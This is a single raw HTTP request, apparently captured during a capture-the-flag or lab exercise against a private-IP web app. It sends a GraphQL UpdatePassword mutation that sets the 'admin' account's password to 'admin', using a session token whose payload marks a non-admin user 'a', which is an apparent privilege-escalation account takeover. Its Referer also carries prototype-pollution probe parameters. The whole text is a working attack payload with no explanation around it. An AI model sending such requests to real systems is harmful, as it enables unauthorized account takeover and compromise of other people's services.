POST /graphql HTTP/1.1
Host: 172.26.21.148:1337
Content-Length: 217
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://172.26.21.148:1337
Referer: http://172.26.21.148:1337/dashboard?constructor[prototype][a42e5579]=qrhng9ci&constructor.prototype.b1a3fd5b=qrhng9ci&__proto__.ccd80966=qrhng9ci&__proto__[dcb52823]=qrhng9ci
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJpc19hZG1pbiI6MCwiaWF0IjoxNzE3MjM1NTUxfQ.Al_7xWPFflZMSIfO6TO3cXhhaHy1-fgrwoIAm4Q17Sc
Connection: close

{
  "query": "mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }",
  "variables": {
    "username": "admin",
    "password": "admin"
  }
}
